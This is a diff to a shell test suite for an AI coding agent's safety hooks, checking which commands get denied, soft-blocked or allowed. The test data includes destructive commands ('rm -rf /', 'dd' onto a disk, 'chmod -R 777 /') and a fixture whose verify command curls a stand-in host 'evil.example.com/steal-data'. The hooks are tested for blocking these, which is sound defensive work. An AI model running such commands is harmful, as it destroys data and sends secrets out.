@@ -308,7 +308,9 @@ fi
 # Test 4.3: BLOCK when task is complete but no evidence marker
 touch "$FIXTURES_DIR/project-completed/docs/tasks/test/feature/2026-03-16_1200-test/progress.json"
 UNIQUE_SESSION="test-session-$$"
-rm -f "/tmp/.claude-completion-evidence-$UNIQUE_SESSION"
+STATE_DIR="$HOME/.claude/state"
+mkdir -p "$STATE_DIR"
+rm -f "$STATE_DIR/.claude-completion-evidence-$UNIQUE_SESSION"
 
 INPUT=$(make_stop_input)
 if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-completed" CLAUDE_SESSION_ID="$UNIQUE_SESSION" "$HOOKS_DIR/verify-completion.sh" >/dev/null 2>&1; then
@@ -323,7 +325,7 @@ else
 fi
 
 # Test 4.4: ALLOW when evidence marker exists with required fields
-cat > "/tmp/.claude-completion-evidence-$UNIQUE_SESSION" << 'EOF'
+cat > "$STATE_DIR/.claude-completion-evidence-$UNIQUE_SESSION" << 'EOF'
 plan_reread: true
 acceptance_criteria_cited: true
 dev_server_verified: true
@@ -337,10 +339,10 @@ if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-completed" CLAUDE_S
 else
   fail "Blocked completion despite valid evidence marker"
 fi
-rm -f "/tmp/.claude-completion-evidence-$UNIQUE_SESSION"
+rm -f "$STATE_DIR/.claude-completion-evidence-$UNIQUE_SESSION"
 
 # Test 4.5: BLOCK when evidence marker exists but missing required fields
-cat > "/tmp/.claude-completion-evidence-$UNIQUE_SESSION" << 'EOF'
+cat > "$STATE_DIR/.claude-completion-evidence-$UNIQUE_SESSION" << 'EOF'
 plan_reread: true
 dev_server_verified: true
 EOF
@@ -356,7 +358,7 @@ else
     fail "Wrong exit code for incomplete evidence" "Expected 2, got $EXIT_CODE"
   fi
 fi
-rm -f "/tmp/.claude-completion-evidence-$UNIQUE_SESSION"
+rm -f "$STATE_DIR/.claude-completion-evidence-$UNIQUE_SESSION"
 
 # ============================================================
 header "5. post-edit-quality.sh — Auto-Format (Biome/ESLint)"
@@ -1696,6 +1698,482 @@ if grep -q "Do NOT execute\|NOT execute\|plan only" "$CP_SKILL"; then
 else
   fail "SKILL.md missing plan-only enforcement"
 fi
+
+# ============================================================
+header "31. block-dangerous.sh — Hard Blocks vs Soft Blocks (Behavioral)"
+# ============================================================
+
+# Shared temp files for block-dangerous tests
+BD_EXIT_FILE=$(mktemp)
+BD_STDERR_FILE=$(mktemp)
+trap "rm -f $BD_EXIT_FILE $BD_STDERR_FILE" EXIT
+
+# Helper: run block-dangerous.sh, writing exit code and stderr to temp files
+run_block_dangerous() {
+  local command="$1"
+  local input
+  input=$(make_bash_input "$command")
+  local exit_code=0
+  echo "$input" | "$HOOKS_DIR/block-dangerous.sh" >/dev/null 2>"$BD_STDERR_FILE" || exit_code=$?
+  echo "$exit_code" > "$BD_EXIT_FILE"
+}
+
+# Helper: extract permissionDecision from the last hook run
+get_permission_decision() {
+  jq -r '.hookSpecificOutput.permissionDecision // empty' "$BD_STDERR_FILE" 2>/dev/null || true
+}
+
+get_exit_code() {
+  cat "$BD_EXIT_FILE"
+}
+
+# --- HARD BLOCKS: must output permissionDecision: "deny" ---
+
+# Test 31.1: rm -rf / is hard-denied
+run_block_dangerous "rm -rf /"
+DECISION=$(get_permission_decision)
+EXIT=$(get_exit_code)
+if [ "$DECISION" = "deny" ] && [ "$EXIT" = "2" ]; then
+  pass "Hard block: rm -rf / → permissionDecision: deny"
+else
+  fail "Hard block: rm -rf / wrong" "Got decision='$DECISION' exit='$EXIT', expected deny/2"
+fi
+
+# Test 31.2: rm -rf /* is hard-denied
+run_block_dangerous "rm -rf /*"
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "deny" ]; then
+  pass "Hard block: rm -rf /* → permissionDecision: deny"
+else
+  fail "Hard block: rm -rf /* wrong" "Got decision='$DECISION', expected deny"
+fi
+
+# Test 31.3: rm -rf /usr is hard-denied
+run_block_dangerous "rm -rf /usr"
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "deny" ]; then
+  pass "Hard block: rm -rf /usr → permissionDecision: deny"
+else
+  fail "Hard block: rm -rf /usr wrong" "Got decision='$DECISION', expected deny"
+fi
+
+# Test 31.4: dd if= is hard-denied
+run_block_dangerous "dd if=/dev/zero of=/dev/sda"
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "deny" ]; then
+  pass "Hard block: dd if= → permissionDecision: deny"
+else
+  fail "Hard block: dd if= wrong" "Got decision='$DECISION', expected deny"
+fi
+
+# Test 31.5: chmod -R 777 / is hard-denied
+run_block_dangerous "chmod -R 777 /"
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "deny" ]; then
+  pass "Hard block: chmod -R 777 / → permissionDecision: deny"
+else
+  fail "Hard block: chmod -R 777 / wrong" "Got decision='$DECISION', expected deny"
+fi
+
+# --- SOFT BLOCKS: must output permissionDecision: "ask" (NOT deny) ---
+
+# Test 31.6: git push --force is soft-block (ask)
+run_block_dangerous "git push --force origin feature"
+DECISION=$(get_permission_decision)
+EXIT=$(get_exit_code)
+if [ "$DECISION" = "ask" ] && [ "$EXIT" = "2" ]; then
+  pass "Soft block: git push --force → permissionDecision: ask"
+else
+  fail "Soft block: git push --force wrong" "Got decision='$DECISION' exit='$EXIT', expected ask/2"
+fi
+
+# Test 31.7: git push -f is soft-block (ask)
+run_block_dangerous "git push -f origin feature"
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "ask" ]; then
+  pass "Soft block: git push -f → permissionDecision: ask"
+else
+  fail "Soft block: git push -f wrong" "Got decision='$DECISION', expected ask"
+fi
+
+# Test 31.8: git push origin main is soft-block (ask)
+run_block_dangerous "git push origin main"
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "ask" ]; then
+  pass "Soft block: git push origin main → permissionDecision: ask"
+else
+  fail "Soft block: git push origin main wrong" "Got decision='$DECISION', expected ask"
+fi
+
+# Test 31.9: git reset --hard is soft-block (ask)
+run_block_dangerous "git reset --hard HEAD~1"
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "ask" ]; then
+  pass "Soft block: git reset --hard → permissionDecision: ask"
+else
+  fail "Soft block: git reset --hard wrong" "Got decision='$DECISION', expected ask"
+fi
+
+# Test 31.10: git branch -D is soft-block (ask)
+run_block_dangerous "git branch -D feature-branch"
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "ask" ]; then
+  pass "Soft block: git branch -D → permissionDecision: ask"
+else
+  fail "Soft block: git branch -D wrong" "Got decision='$DECISION', expected ask"
+fi
+
+# Test 31.11: git checkout . is soft-block (ask)
+run_block_dangerous "git checkout ."
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "ask" ]; then
+  pass "Soft block: git checkout . → permissionDecision: ask"
+else
+  fail "Soft block: git checkout . wrong" "Got decision='$DECISION', expected ask"
+fi
+
+# Test 31.12: git restore . is soft-block (ask)
+run_block_dangerous "git restore ."
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "ask" ]; then
+  pass "Soft block: git restore . → permissionDecision: ask"
+else
+  fail "Soft block: git restore . wrong" "Got decision='$DECISION', expected ask"
+fi
+
+# Test 31.13: git clean -f is soft-block (ask)
+run_block_dangerous "git clean -fd"
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "ask" ]; then
+  pass "Soft block: git clean -fd → permissionDecision: ask"
+else
+  fail "Soft block: git clean -fd wrong" "Got decision='$DECISION', expected ask"
+fi
+
+# Test 31.14: git stash drop is soft-block (ask)
+run_block_dangerous "git stash drop"
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "ask" ]; then
+  pass "Soft block: git stash drop → permissionDecision: ask"
+else
+  fail "Soft block: git stash drop wrong" "Got decision='$DECISION', expected ask"
+fi
+
+# Test 31.15: git stash clear is soft-block (ask)
+run_block_dangerous "git stash clear"
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "ask" ]; then
+  pass "Soft block: git stash clear → permissionDecision: ask"
+else
+  fail "Soft block: git stash clear wrong" "Got decision='$DECISION', expected ask"
+fi
+
+# Test 31.16: git push --force-with-lease is soft-block (ask)
+run_block_dangerous "git push --force-with-lease origin feature"
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "ask" ]; then
+  pass "Soft block: git push --force-with-lease → permissionDecision: ask"
+else
+  fail "Soft block: git push --force-with-lease wrong" "Got decision='$DECISION', expected ask"
+fi
+
+# Test 31.17: npm install is soft-block (ask) when pnpm project
+TEMP_NPM_PROJECT="/tmp/test-npm-block"
+mkdir -p "$TEMP_NPM_PROJECT"
+touch "$TEMP_NPM_PROJECT/pnpm-lock.yaml"
+CLAUDE_PROJECT_DIR="$TEMP_NPM_PROJECT" run_block_dangerous "npm install express"
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "ask" ]; then
+  pass "Soft block: npm install in pnpm project → permissionDecision: ask"
+else
+  fail "Soft block: npm install in pnpm project wrong" "Got decision='$DECISION', expected ask"
+fi
+
+# Test 31.18: npx is soft-block (ask) when pnpm project
+CLAUDE_PROJECT_DIR="$TEMP_NPM_PROJECT" run_block_dangerous "npx create-next-app"
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "ask" ]; then
+  pass "Soft block: npx in pnpm project → permissionDecision: ask"
+else
+  fail "Soft block: npx in pnpm project wrong" "Got decision='$DECISION', expected ask"
+fi
+rm -rf "$TEMP_NPM_PROJECT"
+
+# --- ALLOW: safe commands should pass through ---
+
+# Test 31.19: Safe git commands are allowed
+run_block_dangerous "git status"
+EXIT=$(get_exit_code)
+if [ "$EXIT" = "0" ]; then
+  pass "Allow: git status passes through (exit 0)"
+else
+  fail "Allow: git status should not be blocked" "Got exit=$EXIT, expected 0"
+fi
+
+# Test 31.20: git push to feature branch is allowed
+run_block_dangerous "git push -u origin feature/my-branch"
+EXIT=$(get_exit_code)
+if [ "$EXIT" = "0" ]; then
+  pass "Allow: git push to feature branch passes through (exit 0)"
+else
+  fail "Allow: git push to feature branch should not be blocked" "Got exit=$EXIT, expected 0"
+fi
+
+# Test 31.21: npm allowed when NOT a pnpm project
+TEMP_NPM_OK="/tmp/test-npm-ok"
+mkdir -p "$TEMP_NPM_OK"
+CLAUDE_PROJECT_DIR="$TEMP_NPM_OK" run_block_dangerous "npm install express"
+EXIT=$(get_exit_code)
+if [ "$EXIT" = "0" ]; then
+  pass "Allow: npm install passes in non-pnpm project (exit 0)"
+else
+  fail "Allow: npm install should not be blocked without pnpm-lock.yaml" "Got exit=$EXIT"
+fi
+rm -rf "$TEMP_NPM_OK"
+
+# Test 31.22: git branch -d (lowercase) is allowed (not force-delete)
+run_block_dangerous "git branch -d merged-branch"
+EXIT=$(get_exit_code)
+if [ "$EXIT" = "0" ]; then
+  pass "Allow: git branch -d (safe delete) passes through (exit 0)"
+else
+  fail "Allow: git branch -d should not be blocked" "Got exit=$EXIT, expected 0"
+fi
+
+# --- CROSS-CHECK: no soft block uses "deny" ---
+
+# Test 31.23: Verify block-dangerous.sh has no deny() calls in SOFT BLOCK section
+SOFT_SECTION=$(sed -n '/SOFT BLOCKS/,$ p' "$HOOKS_DIR/block-dangerous.sh")
+if echo "$SOFT_SECTION" | grep -q 'deny "SOFT'; then
+  fail "Soft blocks still using deny() instead of ask()" "All SOFT BLOCK lines must call ask()"
+else
+  pass "All soft blocks use ask(), not deny()"
+fi
+
+# Test 31.24: Verify hard blocks still use deny()
+HARD_SECTION=$(sed -n '/HARD BLOCKS/,/SOFT BLOCKS/ p' "$HOOKS_DIR/block-dangerous.sh")
+if echo "$HARD_SECTION" | grep -q 'deny "BLOCKED'; then
+  pass "Hard blocks correctly use deny()"
+else
+  fail "Hard blocks may be missing deny() calls"
+fi
+
+# ============================================================
+header "32. settings.json — Structural Validation"
+# ============================================================
+
+# Test 32.1: settings.json is valid JSON
+if jq empty "$SETTINGS" 2>/dev/null; then
+  pass "settings.json is valid JSON"
+else
+  fail "settings.json is NOT valid JSON — hook system is broken"
+fi
+
+# Test 32.2: All hook script paths in settings.json exist and are executable
+ALL_HOOK_PATHS=$(jq -r '.. | .command? // empty' "$SETTINGS" | grep '\.claude/hooks/.*\.sh' | sed "s|~|$HOME|g" || true)
+HOOKS_OK=true
+if [ -n "$ALL_HOOK_PATHS" ]; then
+  while IFS= read -r hook_path; do
+    if [ ! -x "$hook_path" ]; then
+      fail "Hook in settings.json not executable: $hook_path"
+      HOOKS_OK=false
+    fi
+  done <<< "$ALL_HOOK_PATHS"
+  if [ "$HOOKS_OK" = true ]; then
+    pass "All hook scripts in settings.json are executable"
+  fi
+else
+  fail "No hook scripts found in settings.json"
+fi
+
+# Test 32.3: Cross-reference — every .sh file in hooks/ that is executable should be registered
+# (informational — not every hook file needs registration, but it catches orphans)
+REGISTERED_HOOKS=$(jq -r '.. | .command? // empty' "$SETTINGS" | grep -oP '[^/]+\.sh' | sort -u || true)
+ACTUAL_HOOKS=$(find "$HOOKS_DIR" -maxdepth 1 -name '*.sh' -executable -printf '%f\n' 2>/dev/null | sort -u)
+UNREGISTERED=""
+for hook_file in $ACTUAL_HOOKS; do
+  # Skip utility files that are sourced, not registered
+  case "$hook_file" in
+    retry-with-backoff.sh|validate-sprint-boundaries.sh|verify-worktree-merge.sh|worktree-preflight.sh|validate-i18n-keys.sh) continue ;;
+  esac
+  if ! echo "$REGISTERED_HOOKS" | grep -q "$hook_file"; then
+    UNREGISTERED="$UNREGISTERED $hook_file"
+  fi
+done
+if [ -z "$UNREGISTERED" ]; then
+  pass "All executable hook scripts are registered in settings.json"
+else
+  fail "Hook scripts exist but are not registered:$UNREGISTERED"
+fi
+
+# ============================================================
+header "33. compound-reminder.sh — Behavioral Tests"
+# ============================================================
+
+# Test 33.1: No completed tasks → exits 0 (allow stop)
+INPUT=$(make_stop_input)
+if echo "$INPUT" | CLAUDE_PROJECT_DIR="/tmp/no-tasks-project" "$HOOKS_DIR/compound-reminder.sh" >/dev/null 2>&1; then
+  pass "compound-reminder: allows stop when no task directory exists"
+else
+  fail "compound-reminder: blocked stop without tasks"
+fi
+
+# Test 33.2: Completed task + no compound marker → exits 2 (block stop)
+COMPOUND_SESSION="test-compound-$$"
+rm -f "$STATE_DIR/.claude-compound-done-$COMPOUND_SESSION"
+# Reuse the project-completed fixture (has all-complete progress.json)
+touch "$FIXTURES_DIR/project-completed/docs/tasks/test/feature/2026-03-16_1200-test/progress.json"
+
+INPUT=$(make_stop_input)
+if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-completed" CLAUDE_SESSION_ID="$COMPOUND_SESSION" "$HOOKS_DIR/compound-reminder.sh" >/dev/null 2>&1; then
+  fail "compound-reminder: allowed stop without compound marker"
+else
+  EXIT_CODE=$?
+  if [ "$EXIT_CODE" -eq 2 ]; then
+    pass "compound-reminder: blocks stop when compound not run (exit 2)"
+  else
+    fail "compound-reminder: wrong exit code" "Expected 2, got $EXIT_CODE"
+  fi
+fi
+
+# Test 33.3: Completed task + compound marker exists → exits 0 (allow stop)
+touch "$STATE_DIR/.claude-compound-done-$COMPOUND_SESSION"
+INPUT=$(make_stop_input)
+if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-completed" CLAUDE_SESSION_ID="$COMPOUND_SESSION" "$HOOKS_DIR/compound-reminder.sh" >/dev/null 2>&1; then
+  pass "compound-reminder: allows stop when compound marker exists"
+else
+  fail "compound-reminder: blocked stop despite compound marker"
+fi
+rm -f "$STATE_DIR/.claude-compound-done-$COMPOUND_SESSION"
+
+# Test 33.4: Respects stop_hook_active flag → exits 0
+INPUT=$(make_stop_input_active)
+if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-completed" CLAUDE_SESSION_ID="$COMPOUND_SESSION" "$HOOKS_DIR/compound-reminder.sh" >/dev/null 2>&1; then
+  pass "compound-reminder: respects stop_hook_active flag"
+else
+  fail "compound-reminder: did not respect stop_hook_active"
+fi
+
+# ============================================================
+header "34. block-dangerous.sh — Force Push via +refspec"
+# ============================================================
+
+# Test 34.1: Soft block git push origin +main
+run_block_dangerous "git push origin +main"
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "ask" ]; then
+  pass "Soft block: git push origin +main (+ refspec) → permissionDecision: ask"
+else
+  fail "git push origin +main not soft-blocked" "Got decision=$DECISION, expected ask"
+fi
+
+# Test 34.2: Soft block git push origin +feature/branch
+run_block_dangerous "git push origin +feature/branch"
+DECISION=$(get_permission_decision)
+if [ "$DECISION" = "ask" ]; then
+  pass "Soft block: git push origin +feature/branch → permissionDecision: ask"
+else
+  fail "git push +feature/branch not soft-blocked" "Got decision=$DECISION, expected ask"
+fi
+
+# Test 34.3: Allow normal git push (no +)
+run_block_dangerous "git push origin feature/my-branch"
+EXIT=$(get_exit_code)
+if [ "$EXIT" = "0" ]; then
+  pass "Allow: git push without + passes through (exit 0)"
+else
+  fail "Normal git push blocked" "Got exit=$EXIT, expected 0"
+fi
+
+# ============================================================
+header "35. check-test-exists.sh — Entry Point Line-Count Threshold"
+# ============================================================
+
+# Test 35.1: Short entry point (≤20 lines) → allowed without test
+TEMP_PROJECT="/tmp/test-entry-short"
+mkdir -p "$TEMP_PROJECT/src"
+# Create a short index.ts (5 lines)
+printf 'export { auth } from "./auth";\nexport { db } from "./db";\nexport { api } from "./api";\n' > "$TEMP_PROJECT/src/index.ts"
+# Create test infrastructure marker
+echo '{"devDependencies":{"vitest":"^1.0.0"}}' > "$TEMP_PROJECT/package.json"
+mkdir -p "$TEMP_PROJECT/node_modules/.bin"
+
+INPUT=$(make_write_input "$TEMP_PROJECT/src/index.ts")
+if echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/check-test-exists.sh" >/dev/null 2>&1; then
+  pass "TDD: allows short entry point (≤20 lines) without test"
+else
+  fail "TDD: blocked short entry point that should be allowed"
+fi
+rm -rf "$TEMP_PROJECT"
+
+# Test 35.2: Long entry point (>20 lines) → blocked without test
+TEMP_PROJECT="/tmp/test-entry-long"
+mkdir -p "$TEMP_PROJECT/src"
+# Create a long index.ts (25 lines of real logic)
+{
+  for i in $(seq 1 25); do
+    echo "export const func${i} = () => { return $i; };"
+  done
+} > "$TEMP_PROJECT/src/index.ts"
+echo '{"devDependencies":{"vitest":"^1.0.0"}}' > "$TEMP_PROJECT/package.json"
+mkdir -p "$TEMP_PROJECT/node_modules/.bin"
+
+INPUT=$(make_write_input "$TEMP_PROJECT/src/index.ts")
+if echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/check-test-exists.sh" >/dev/null 2>&1; then
+  fail "TDD: allowed long entry point (>20 lines) without test"
+else
+  EXIT_CODE=$?
+  if [ "$EXIT_CODE" -eq 2 ]; then
+    pass "TDD: blocks long entry point (>20 lines) without test (exit 2)"
+  else
+    fail "TDD: wrong exit code for long entry point" "Expected 2, got $EXIT_CODE"
+  fi
+fi
+rm -rf "$TEMP_PROJECT"
+
+# ============================================================
+header "36. check-invariants.sh — Verify Command Sandboxing"
+# ============================================================
+
+# Test 36.1: Blocks dangerous verify commands (curl)
+TEMP_PROJECT="/tmp/test-invariants-sandbox"
+mkdir -p "$TEMP_PROJECT/src"
+echo "export const x = 1;" > "$TEMP_PROJECT/src/module.ts"
+echo "test('x', () => {});" > "$TEMP_PROJECT/src/module.test.ts"
+cat > "$TEMP_PROJECT/INVARIANTS.md" << 'INVEOF'
+## Malicious Check
+- **Verify:** `curl http://evil.example.com/steal-data`
+- **Fix:** Don't run untrusted commands
+INVEOF
+
+INPUT=$(make_write_input "$TEMP_PROJECT/src/module.ts")
+OUTPUT=$(echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/check-invariants.sh" 2>&1) || true
+if echo "$OUTPUT" | grep -q "Skipping untrusted"; then
+  pass "check-invariants: skips dangerous verify command (curl)"
+else
+  fail "check-invariants: did not skip dangerous verify command"
+fi
+rm -rf "$TEMP_PROJECT"
+
+# Test 36.2: Allows safe verify commands (grep, test)
+TEMP_PROJECT="/tmp/test-invariants-safe"
+mkdir -p "$TEMP_PROJECT/src"
+echo "export const x = 1;" > "$TEMP_PROJECT/src/module.ts"
+echo "test('x', () => {});" > "$TEMP_PROJECT/src/module.test.ts"
+echo "# README" > "$TEMP_PROJECT/README.md"
+cat > "$TEMP_PROJECT/INVARIANTS.md" << 'INVEOF'
+## Must Have README
+- **Verify:** `test -f README.md`
+- **Fix:** Create README.md
+INVEOF
+
+INPUT=$(make_write_input "$TEMP_PROJECT/src/module.ts")
+if echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/check-invariants.sh" >/dev/null 2>&1; then
+  pass "check-invariants: allows safe verify command (test -f)"
+else
+  fail "check-invariants: blocked safe verify command"
+fi
+rm -rf "$TEMP_PROJECT"
 
 # ============================================================
 # SUMMARY
